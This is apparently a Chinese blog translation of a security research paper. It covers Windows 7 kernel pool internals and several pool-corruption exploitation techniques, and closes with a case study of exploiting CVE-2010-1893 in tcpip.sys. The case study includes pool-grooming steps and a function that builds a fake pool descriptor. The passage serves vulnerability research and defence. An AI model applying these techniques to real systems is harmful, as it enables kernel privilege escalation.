+<h2 id="2-7分配算法"><a href="#2-7分配算法" class="headerlink" title="2.7分配算法"></a>2.7分配算法</h2><p>为了分配池内存，内核模块和第三方驱动程序调用<br>ExAllocatePoolWithTag（或其任何包装函数），由执行内核导出。此函数将首先尝试使用lookaside列表，然后是ListHeads列表，如果没有返回池块，则从池页面分配程序请求一个页。以下伪代码大致概述了其实现。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">PVOID</div><div class="line">ExAllocatePoolWithTag( POOL_TYPE PoolType,</div><div class="line">SIZE_T NumberOfBytes,</div><div class="line">ULONG Tag)</div><div class="line">// call pool page allocator if size is above 4080 bytes</div><div class="line">if (NumberOfBytes &gt; 0xff0) &#123;</div><div class="line">// call nt!ExpAllocateBigPool</div><div class="line">&#125;</div><div class="line">// attempt to use lookaside lists</div><div class="line">if (PoolType &amp; PagedPool) &#123;</div><div class="line">if (PoolType &amp; SessionPool &amp;&amp; BlockSize &lt;= 0x19) &#123;</div><div class="line">// try the session paged lookaside list</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">else if (BlockSize &lt;= 0x20) &#123;</div><div class="line">// try the per-processor paged lookaside list</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">// lock paged pool descriptor (round robin or local node)</div><div class="line">&#125;</div><div class="line">else &#123; // NonPagedPool</div><div class="line">if (BlockSize &lt;= 0x20) &#123;</div><div class="line">// try the per-processor non-paged lookaside list</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">// lock non-paged pool descriptor (local node)</div><div class="line">&#125;</div><div class="line">// attempt to use listheads lists</div><div class="line">for (n = BlockSize-1; n &lt; 512; n++) &#123;</div><div class="line">if (ListHeads[n].Flink == &amp;ListHeads[n]) &#123; // empty</div><div class="line">continue; // try next block size</div><div class="line">&#125;</div><div class="line">// safe unlink ListHeads[n].Flink</div><div class="line">// split if larger than needed</div><div class="line">// return chunk</div><div class="line">&#125;</div><div class="line">// no chunk found, call nt!MiAllocatePoolPages</div><div class="line">// split page and return chunk</div></pre></td></tr></table></figure></p>
+<p>如果从ListHeads [n]列表中返回大于所请求大小的块，则该块被拆分。 为了减少碎片，分配器返回的超大块部分取决于其相对页位置。如果块是页面对齐的，则从块的前面分配所请求的大小。如果块不是页对齐，则从块的后面分配所请求的大小。无论哪种方式，拆分块的剩余（未使用）片段都放在适当的ListHeads列表的尾部。</p>
+<h2 id="2-8释放算法"><a href="#2-8释放算法" class="headerlink" title="2.8释放算法"></a>2.8释放算法</h2><p>ExFreePoolWithTag实现的免费算法检查池要释放的块的头部，并将其释放到适当的列表。 为了<br>为了减少碎片，它也试图合并周围的释放块。以下伪代码显示了算法的工作原理。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">VOID</div><div class="line">ExFreePoolWithTag( PVOID Entry,</div><div class="line">ULONG Tag)</div><div class="line">if (PAGE_ALIGNED(Entry)) &#123;</div><div class="line">// call nt!MiFreePoolPages</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">if (Entry-&gt;BlockSize != NextEntry-&gt;PreviousSize)</div><div class="line">BugCheckEx(BAD_POOL_HEADER);</div><div class="line">if (Entry-&gt;PoolType &amp; SessionPagedPool &amp;&amp; Entry-&gt;BlockSize &lt;= 0x19) &#123;</div><div class="line">// put in session pool lookaside list</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">else if (Entry-&gt;BlockSize &lt;= 0x20) &#123;</div><div class="line">if (Entry-&gt;PoolType &amp; PagedPool) &#123;</div><div class="line">// put in per-processor paged lookaside list</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">else &#123; // NonPagedPool</div><div class="line">// put in per-processor non-paged lookaside list</div><div class="line">// return on success</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">if (ExpPoolFlags &amp; DELAY_FREE) &#123; // 0x200</div><div class="line">if (PendingFreeDepth &gt;= 0x20) &#123;</div><div class="line">// call nt!ExDeferredFreePool</div><div class="line">&#125;</div><div class="line">// add Entry to PendingFrees list</div><div class="line">&#125;</div><div class="line">else &#123;</div><div class="line">if (IS_FREE(NextEntry) &amp;&amp; !PAGE_ALIGNED(NextEntry)) &#123;</div><div class="line">// safe unlink next entry</div><div class="line">// merge next with current chunk</div><div class="line">&#125;</div><div class="line">if (IS_FREE(PreviousEntry)) &#123;</div><div class="line">// safe unlink previous entry</div><div class="line">// merge previous with current chunk</div><div class="line">&#125;</div><div class="line">if (IS_FULL_PAGE(Entry))</div><div class="line">// call nt!MiFreePoolPages</div><div class="line">else &#123;</div><div class="line">// insert Entry to ListHeads[BlockSize - 1]</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>DELAY FREE池标志（nt！ExpPoolFlags＆0x200）可实现性能优化，可以同时释放多个池分配以摊销池获取和释放。此机制在[11]中简要提及，如果可用物理页面数（nt！MmNumberOfPhysicalPages）大于或等于0x1fc00.5，则Windows XP SP2或更高版本启用。使用时每次新的ExFreePoolWithTag调用将该块附加到被释放到每个池描述符的PendingFrees列表中。如果列表包含32个或更多的块（由PendingFreeDepth确定），则在对ExDeferredFreePool的调用中处理。 此函数遍历每个条目并将其释放到相应的ListHeads列表，如以下伪代码所示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">VOID</div><div class="line">ExDeferredFreePool( PPOOL_DESCRIPTOR PoolDesc,</div><div class="line">BOOLEAN bMultipleThreads)</div><div class="line">for each (Entry in PendingFrees) &#123;</div><div class="line">if (IS_FREE(NextEntry) &amp;&amp; !PAGE_ALIGNED(NextEntry)) &#123;</div><div class="line">// safe unlink next entry</div><div class="line">// merge next with current chunk</div><div class="line">&#125;</div><div class="line">if (IS_FREE(PreviousEntry)) &#123;</div><div class="line">// safe unlink previous entry</div><div class="line">// merge previous with current chunk</div><div class="line">&#125;</div><div class="line">if (IS_FULL_PAGE(Entry))</div><div class="line">// add to full page list</div><div class="line">else &#123;</div><div class="line">// insert Entry to ListHeads[BlockSize - 1]</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">for each (page in full page list) &#123;</div><div class="line">// call nt!MiFreePoolPages</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>释放到lookaside并且池描述符ListHeads总是放在合适的列表的前面。这个规则的例外是分列块的剩余片段，放在列表的尾部。 当内存管理器返回大于所请求大小的块（如第2.7节所述）时，块将被拆分，例如在ExpBigPoolAllocation中分割的完整页面和ExAllocatePoolWithTag中分割的ListHeads条目。为了尽可能频繁地使用CPU缓存，分配总是从最近使用的块，从适当的列表的前面。</p>
+<h2 id="2-9-AMD64-x64内核池更改"><a href="#2-9-AMD64-x64内核池更改" class="headerlink" title="2.9 AMD64 / x64内核池更改"></a>2.9 AMD64 / x64内核池更改</h2><p>尽管支持更大的物理地址空间，x64 Windows不会对内核池引入任何重大更改。 但是，为了适应指针宽度的变化，块大小的粒度增加到16个字节，以BlockSize =（NumberOfBytes + 0x1F）&gt;&gt; 4计算。为了反映这一变化，相应地更新池头部。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">typedef struct _POOL_HEADER</div><div class="line">&#123;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">struct</div><div class="line">/*0x000*/ ULONG32 PreviousSize : 8;</div><div class="line">/*0x000*/ ULONG32 PoolIndex : 8;</div><div class="line">/*0x000*/ ULONG32 BlockSize : 8;</div><div class="line">/*0x000*/ ULONG32 PoolType : 8;</div><div class="line">&#125;;</div><div class="line">/*0x000*/ ULONG32 Ulong1;</div><div class="line">&#125;;</div><div class="line">/*0x004*/ ULONG32 PoolTag;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x008*/ struct _EPROCESS* ProcessBilled;</div><div class="line">struct</div><div class="line">&#123;</div><div class="line">/*0x008*/ UINT16 AllocatorBackTraceIndex;</div><div class="line">/*0x00A*/ UINT16 PoolTagHash;</div><div class="line">/*0x00C*/ UINT8 _PADDING0_[0x4];</div><div class="line">&#125;;</div><div class="line">&#125;;</div><div class="line">&#125; POOL_HEADER, *PPOOL_HEADER;</div></pre></td></tr></table></figure></p>
+<p>由于块大小粒度的变化，PreviousSize和BlockSize<br>都减少到8位。 因此，池描述符ListHeads持有256<br>双向列表，而不是x86上的512。 这也允许一个额外的<br>位被分配给PoolIndex，因此256个节点（池描述符）可能是<br>支持x64，x86上超过128个。此外，池头扩展为16字节，并且包括用于配额管理的ProcessBilled指针，以标识分配所收取的进程。 在x86上，该指针存储在池主体的最后四个字节中。 我们在3.5节讨论使用配额过程指针的攻击。</p>
+<h2 id="3-内核池攻击"><a href="#3-内核池攻击" class="headerlink" title="3 内核池攻击"></a>3 内核池攻击</h2><p>在本节中，我们讨论了对Windows 7内核的几个实际攻击<br>池。首先，在3.1节中，我们展示了对ListHeads池块的（un）安全unlinking中的LIST ENTRY结构进行了攻击。在第3.2节和第3.3节中，我们分别对单向lookaside链表和延迟的释放列表进行了攻击。在3.4节中我们提出了对被释放的分配块的池头的攻击。在第3.4节中，我们提出了对被释放的分配块的池头部的攻击，最后，在第3.5节中，我们显示了对配额充值池分配的攻击。</p>
+<h2 id="3-1-ListEntry-Flink覆盖"><a href="#3-1-ListEntry-Flink覆盖" class="headerlink" title="3.1 ListEntry Flink覆盖"></a>3.1 ListEntry Flink覆盖</h2><p>为了解决对内核池溢出的通用利用，Windows 7<br>执行安全的unlinking以验证ListHeads列表中的池块的LIST ENTRY指针。然而，在从ListHeads [n]（给定块大小）中分配池块时，该算法验证了ListHeads [n]的LIST ENTRY结构，而不是实际块被unlinking的结构。因此，在空闲块中重写前向指针可能会导致将ListHeads [n]的地址写入攻击者控制的地址（图1）。</p>
+<p><img src="/img/图一.png" alt="image"></p>
+<p>此攻击需要至少两个空闲块存在于目标ListHeads [n]列表中。 否则，ListHeads [n] .Blink将验证unlinked的块的前向指针。在示例1中，ListHeads列表中的池块的前向指针已被攻击者选择的地址破坏。 反过来，当这个块在ExAllocatePoolWithTag中分配时，算法尝试在攻击者控制的地址（eax）处在LIST ENTRY结构的后向指针上写入ListHeads[n]（esi）的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">eax=80808080 ebx=829848c0 ecx=8cc15768 edx=8cc43298 esi=82984a18 edi=[..]</div><div class="line">eip=8296f067 esp=82974c00 ebp=82974c48 iopl=0 nv up ei pl zr na pe nc</div><div class="line">cs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00010246</div><div class="line">nt!ExAllocatePoolWithTag+0x4b7:</div><div class="line">8296f067 897004 mov dword ptr [eax+4],esi ds:0023:80808084=????????</div></pre></td></tr></table></figure>
+<p><strong>Example 1: ListEntry Flink overwrite</strong></p>
+<p>虽然不能从用户模式上下文中确定esi的值，但有时可以推断出它的值。例如，如果仅定义了一个非分页池（如2.2所述），则esi将指向ntoskrnl数据段中的固定位置（nt!NonPagedPoolDescriptor）。 如果池描述符是从内存中分配的，那么可以从其定义的池内存范围中假设它的下落。 因此，攻击者可以覆盖重要的全局变量[14]或内核对象指针[6]（例如通过部分指针重写），以便获得任意代码执行。</p>
+<p>攻击者还可以使用覆盖中的用户模式指针将任意写入扩展到完全受控的内核分配。 这是因为在unlinking已损坏块之后，ListHeads [n] .Flink被更新为指向下一个空闲块（攻击者控制的指针）。 因为攻击者提供的地址的后向指针被更新以指向ListHeads [n]，所以池分配器在将从空闲列表的usermode指针安全地unlinking中没有问题。</p>
+<h2 id="3-2-Lookaside-Next指针覆盖"><a href="#3-2-Lookaside-Next指针覆盖" class="headerlink" title="3.2 Lookaside Next指针覆盖"></a>3.2 Lookaside Next指针覆盖</h2><p>lookaside为快速和轻量化而设计，因此不会引入与双向链接ListHeads列表相同的一致性检查。 作为单向链接，lookaside列表中的每个条目都保存指向下一个条目的指针。 由于没有任何检查证明这些指针的有效性，攻击者可能会使用池损坏漏洞强制池分配器返回任意地址以检索下一个空闲的lookaside块。 反过来，这可能会让攻击者破坏任意的内核内存。</p>
+<p><img src="/img/图二.png" alt="image"></p>
+<p>如第2.5节所述，内存管理器对池块和池页面使用lookaside表。 对于lookaside池块，Next指针直接跟随8字节池头（POOL HEADER）。因此，覆盖Next指针最多需要x86上的12字节溢出。 为了将池块释放到lookaside表中，必须满足以下条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">– BlockSize &lt;= 0x20 for (paged/non-paged) pool chunks</div><div class="line">– BlockSize &lt;= 0x19 for paged session pool chunks</div><div class="line">– Lookaside list for target BlockSize is not full</div><div class="line">– Hot/cold page separation is not used (ExpPoolFlags &amp; 0x100)</div></pre></td></tr></table></figure></p>
+<p>为了将lookaside指针损坏扩展为n字节任意内存覆盖，必须先分配目标块大小，直到返回损坏的指针（图2）。 此外，必须在一定程度上控制所分配的块的内容，以便影响用于覆盖的数据。 对于分页池分配，分配unicode字符串（如NtCreateSymbolicLinkObject）的本机API提供了一种方便的方式来填充几乎任何字节组合的任何大小的块。 这样的API也可以用于碎片整理和操纵池内存布局，以控制诸如未初始化的指针和双重释放的可利用的图元。</p>
+<p><img src="/img/图三.png" alt="image"></p>
+<p>与lookaside池块不同，lookaside池页（图3）将Next指针存储在offset null，因为没有与其相关联的池头。如果保持以下条件，分配的池页将被释放到lookaside表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">NumberOfPages = 1 for paged pool pages</div><div class="line">– NumberOfPages &lt;= 3 for non-paged pool pages</div><div class="line">– Lookaside list for target page count is not full</div></pre></td></tr></table></figure></p>
+<p>只要内存管理器必须要求额外的池内存，不能从ListHeads或lookaside表中获取，则由nt!MiAllocatePoolPages返回池页面。由于这通常由许多并发系统线程执行，因此操作内核池布局以将溢出位于旁边在llokaside中的空闲池页面旁边显然比完成更容易。 另一方面，当使用lookaside池块时，可以使用不经常请求的块大小值，以便对存储器布局进行更细粒度的控制。这可以通过检查后备管理结构中的TotalAllocates值来完成。</p>
+<h2 id="3-3-PendingFrees-Next指针覆盖"><a href="#3-3-PendingFrees-Next指针覆盖" class="headerlink" title="3.3 PendingFrees Next指针覆盖"></a>3.3 PendingFrees Next指针覆盖</h2><p>从第2.8节回顾，等待被释放的池条目存储在单向链接的PendingFrees列表中。 由于在遍历这些列表中未执行任何检查，攻击者可能会利用池损坏漏洞来破坏PendingFrees列表条目的Next指针。反过来，这将允许攻击者释放一个任意地址到一个选择的池描述符ListHeads列表和可能控制后续池分配的内存（图4）。</p>
+<p><img src="/img/图四.png" alt="image"></p>
+<p>攻击延迟释放列表的一个值得注意的注意事项是内核池很频繁地处理这个列表（每32次是释放一次）。 事实上，数百个线程可以安排在同一个内核池中，并且还可以在多核机器上并行处理6。 因此，很可能已经从缓冲区溢出中定位的块已经从延迟释放列表中删除并放置在ListHeads列表中。 因此，我们几乎不能认为这种攻击是实际的。然而，由于某些池描述符的使用频率低于其他池（如会话池描述符），所以在某些情况下对延迟释放列表的攻击也许是可行的。</p>
+<h2 id="3-4-PoolIndex覆盖"><a href="#3-4-PoolIndex覆盖" class="headerlink" title="3.4 PoolIndex覆盖"></a>3.4 PoolIndex覆盖</h2><p>如果给池类型定义了多个池描述符，则池块的PoolIndex表示关联的池描述符数组的索引。 因此，在使用ListHeads条目时，池块总是被释放到其适当的池描述符。 然而，由于验证不足，一个格式不正确的PoolIndex可能会触发一个数组越界，从而允许攻击者覆盖任意的内核内存。</p>
+<p><img src="/img/图五.png" alt="image"></p>
+<p>对于分页池，PoolIndex始终表示分页池描述符数组（nt！ExpPagedPoolDescriptor）中的索引。 在检查的构建中，索引值在与nt！ExpNumberOfPagedPools的比较中进行验证，以防止任何数组越界访问。 然而，在空闲（retail）构建中，索引未被验证。 对于非分页池，PoolIndex仅在NUMA感知系统中存在多个节点时才表示nt！ExpNonPagedPoolDescriptor中的索引。再次，在空闲构建中，PoolIndex未被验证。</p>
+<p>一个格式不正确的PoolIndex（只需要一个2字节的池溢出）可能会使分配的池块被释放到空指针池描述符（图5）。 通过映射虚拟空页，攻击者可以完全控制池描述符及其ListHeads条目。 反过来，这可能允许攻击者在链接到列表时将池块的地址写入任意地址。 这是因为当前在前面的块的Blink被更新为释放的块的地址，这样ListHeads [n] .Flink-&gt; Blink = FreedChunk。 值得注意的是，由于释放的块没有返回到任何真实的池描述符，所以不需要清理（删除stale条目等）内核池。</p>
+<p><img src="/img/图六.png" alt="image"></p>
+<p>如果启用延迟池释放（如第2.8节所述），则可以通过创建伪造的PendingFrees列表来实现类似的效果（图6）。 在这种情况下，列表中的第一个条目将指向攻击者控制的地址。 此外，池描述符中的PendingFreeDepth的值将大于或等于0x20以触发PendingFrees列表的处理。<br>示例2演示了PoolIndex覆盖如何可能导致将用户控制的页面地址（eax）写入任意目标地址（esi）。 为了执行任意代码，攻击者可以利用该方法用用户模式页面地址覆盖不经常使用的内核函数指针，并从相同的进程上下文触发其执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">eax=20000008 ebx=000001ff ecx=000001ff edx=00000538 esi=80808080 edi=[..]</div><div class="line">eip=8293c943 esp=9c05fb20 ebp=9c05fb58 iopl=0 nv up ei pl nz na po nc</div><div class="line">cs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00010202</div><div class="line">nt!ExDeferredFreePool+0x2e3:</div><div class="line">8293c943 894604 mov dword ptr [esi+4],eax ds:0023:80808084=????????</div></pre></td></tr></table></figure></p>
+<p>Example 2: PoolIndex overwrite on delayed free</p>
+<p>如果块的PoolType被覆盖（例如通过将其设置为PagedPool），则PoolIndex覆盖攻击可以应用于任何池类型。 由于这需要BlockSize也被覆盖，攻击者必须知道溢出块的大小或者创建一个嵌入其中的伪边界块。 这是必需的，因为FreedBlock-&gt; BlockSize = NextBlock-&gt; PreviousSize必须保持，由释放算法检查。 另外，块大小应该大于0x20以避免lookaside表（忽略PoolIndex）。 但是请注意，嵌入式池块可能会潜在地破坏块数据中的重要字段或指针。</p>
+<h2 id="3-5配额进程指针覆盖"><a href="#3-5配额进程指针覆盖" class="headerlink" title="3.5配额进程指针覆盖"></a>3.5配额进程指针覆盖</h2><p>由于可以为分配的池内存收取进程，池分配必须为池算法提供足够的信息，以将收取的配额返回到正确的进程。 因此，池块可以可选地存储指向关联的进程对象的指针。 在x64上，过程对象指针存储在池头的最后八个字节中，如第2.9节所述，而在x86上，指针被附加到池主体。 在池损坏漏洞中覆盖此指针（图7）可能允许攻击者在返回带电配额时释放使用中的进程对象或损坏任意内存。</p>
+<p><img src="/img/图七.png" alt="image"></p>
+<p>每当池分配器被释放时，释放算法在实际将内存返回到适当的空闲列表或lookaside表之前检查配额位（0x8）的池类型。 如果该位被置位，它将尝试通过调用nt！PspReturnQuota返回带电量的配额，然后取消引用关联的进程对象。 因此，覆盖过程对象指针可能允许攻击者减少任意进程对象的引用（指针）计数。 如果满足正确的条件（例如当引用计数降低到零时，句柄计数为零，则引用计数不一致性可能导致释放后使用）。</p>
+<p><img src="/img/图八.png" alt="image"></p>
+<p>如果进程对象指针被替换为指向用户模式内存的指针，则攻击者可以创建一个假的EPROCESS对象来控制指向EPROCESS QUOTA BLOCK结构（图8）的指针，其中存储了配额信息。 在空闲时，通过减去分配的大小来更新指示在该结构中使用的配额的值。 因此，攻击者可以在收取指定的配额后，减少任意地址的值。 只要配置位和配额过程对象指针都被设置，攻击者就可以对任何池分配进行两次攻击。</p>
+<h2 id="4案例研究：CVE-2010-1893"><a href="#4案例研究：CVE-2010-1893" class="headerlink" title="4案例研究：CVE-2010-1893"></a>4案例研究：CVE-2010-1893</h2><p>在本节中，我们应用3.4节中描述的PoolIndex覆盖技术，以利用MS10-058 [10]中提到的Windows TCP / IP内核模块（CVE-2010-1893）中的池溢出。所描述的攻击仅基于池管理结构，它不依赖于任何涉及的池块中保存的数据。</p>
+<h2 id="4-1关于漏洞"><a href="#4-1关于漏洞" class="headerlink" title="4.1关于漏洞"></a>4.1关于漏洞</h2><p>Windows TCP / IP内核模块或tcpip.sys实现了几个功能用于控制插座的模式。 这些功能大部分可以通过调用WSAIoctl并提供所需操作的I/O控制代码从用户模式访问。在指定SIO ADDRESS LIST SORT ioctl时，tcpip.sys调用IppSortDestinationAddresses（）对IPv6和IPv4目标地址的列表进行排序，以确定建立连接的最佳可用地址。该函数发现易受攻击[17]到整数溢出 Windows 7 / Windows 2008 R2和Windows Vista / Windows 2008，因为它一直不使用安全的整数函数。因此，为地址列表指定大量地址可能会导致缓冲区分配不足，导致IppFlattenAddressList（）中的池溢出。</p>
+<h2 id="4-2准备池内存"><a href="#4-2准备池内存" class="headerlink" title="4.2准备池内存"></a>4.2准备池内存</h2><p>内核池利用的一个重要方面是能够始终覆盖所需的内存。 由于内核池的分段状态使分配的位置不可预测，攻击者必须首先使用内核对象或其他可控内存分配对内核池进行碎片整理。 在这方面的目标是分配所有的空闲块，以使池分配器返回一个新的页面。 填充新分配的具有相同大小的分配的页面并释放每秒的分配允许攻击者为易受攻击的缓冲区创建漏洞。 这将使攻击者能够溢出用于填充内核池的对象或内存分配。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">kd&gt; !pool @eax</div><div class="line">Pool page 976e34c8 region is Nonpaged pool</div><div class="line">976e32e0 size: 60 previous size: 60 (Allocated) IoCo (Protected)</div><div class="line">976e3340 size: 60 previous size: 60 (Free) IoCo</div><div class="line">976e33a0 size: 60 previous size: 60 (Allocated) IoCo (Protected)</div><div class="line">976e3400 size: 60 previous size: 60 (Free) IoCo</div><div class="line">976e3460 size: 60 previous size: 60 (Allocated) IoCo (Protected)</div><div class="line">*976e34c0 size: 60 previous size: 60 (Allocated) *Ipas</div><div class="line">Pooltag Ipas : IP Buffers for Address Sort, Binary : tcpip.sys</div><div class="line">976e3520 size: 60 previous size: 60 (Allocated) IoCo (Protected)</div><div class="line">976e3580 size: 60 previous size: 60 (Free) IoCo</div><div class="line">976e35e0 size: 60 previous size: 60 (Allocated) IoCo (Pr</div></pre></td></tr></table></figure></p>
+<p>Example 3: Address sort buffer allocated in user fragmented pool</p>
+<p>在示例3中，内核池已经填充了IoCompletionReserve对象（使用NtAllocateReserveObject [7]），其中每秒的分配随后被释放。 因此，当在IppSortDestinationAddresses（）中分配与释放的块的大小（三个SOCKADDR IN6条目）匹配的地址排序缓冲区时，可能会落入其中一个创建的孔中。</p>
+<h2 id="4-3使用PoolIndex覆盖"><a href="#4-3使用PoolIndex覆盖" class="headerlink" title="4.3使用PoolIndex覆盖"></a>4.3使用PoolIndex覆盖</h2><p>为了利用PoolIndex攻击，攻击者必须溢出以下池块的池头，并将其PoolType设置为PagedPool | InUse（3），并将其PoolIndex设置为数组越界（例如大多数单个处理器上的5个 系统），如示例4所示。这将导致在释放损坏的池块时引用空指针池描述符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">kd&gt; dt nt!_POOL_HEADER 976e3520</div><div class="line">+0x000 PreviousSize : 0y000001100 (0xc)</div><div class="line">+0x000 PoolIndex : 0y0000101 (0x5) &lt;-- out-of-bounds index</div><div class="line">+0x002 BlockSize : 0y000001100 (0xc)</div><div class="line">+0x002 PoolType : 0y0000011 (0x3) &lt;-- PagedPool|InUse</div><div class="line">+0x000 Ulong1 : 0x60c0a0c</div><div class="line">+0x004 PoolTag : 0xef436f49</div><div class="line">+0x004 AllocatorBackTraceIndex : 0x6f49</div><div class="line">+0x006 PoolTagHash : 0xef43</div></pre></td></tr></table></figure></p>
+<p>Example 4: Pool header after overflow - corrupting PoolIndex</p>
+<p>在LIST1的函数中，我们初始化必要的池描述符值来执行攻击。 在此功能中，PoolAddress指向用户控制的池块（例如分配在用户模式页面上），WriteAddress设置写入PoolAddress指针的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">VOID</div><div class="line">InitPoolDescriptor ( PPOOL_DESCRIPTOR PoolDescriptor ,</div><div class="line">PPOOL_HEADER PoolAddress ,</div><div class="line">PVOID WriteAddress )</div><div class="line">&#123;</div><div class="line">ULONG i ;</div><div class="line">RtlZeroMemory ( PoolDescriptor , sizeof ( POOL_DESCRIPTOR ) ) ;</div><div class="line">PoolDescriptor - &gt; PoolType = PagedPool ;</div><div class="line">PoolDescriptor - &gt; PagedLock . Count = 1;</div><div class="line">// create pending frees list</div><div class="line">PoolDescriptor - &gt; PendingFreeDepth = 0 x20 ;</div><div class="line">PoolDescriptor - &gt; PendingFrees = ( VOID **) ( PoolAddress +1) ;</div><div class="line">// create ListHeads entries with target address</div><div class="line">for ( i =0; i &lt;512; i ++) &#123;</div><div class="line">PoolDescriptor - &gt; ListHeads [ i ]. Flink = ( PCHAR )</div><div class="line">WriteAddress - sizeof ( PVOID ) ;</div><div class="line">PoolDescriptor - &gt; ListHeads [ i ]. Blink = ( PCHAR )</div><div class="line">WriteAddress - sizeof ( PVOID ) ;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>Listing 1. Function initializing a crafted pool descriptor</p>
+<p>我们假设要使用的挂起的空闲列表大多数系统具有512MB或更多RAM。 因此，用户控制的池块的地址最终将被写入到WriteAddress指示的地址中，这可以用来覆盖内核函数指针，从而使exploitation细微。 如果未使用挂起的空闲列表，则释放的内核池块（内核地址）的地址将最终写入指定的地址，在这种情况下，需要其他方法，例如部分指针重写，以执行任意代码。</p>
+<p>触发溢出之前的最后一个任务是初始化PoolAddress指向的内存区域，使得伪造池块（在挂起的空闲列表中）正确地返回到精心设计的ListHeads列表（触发任意写入）。 在LIST2的函数中，我们创建一个有两个边界池块的布局，PoolIndex再次将数组越界的索引引用到关联的池描述符数组中。 此外，BlockSize必须足够大，以避免使用lookaside列表。</p>
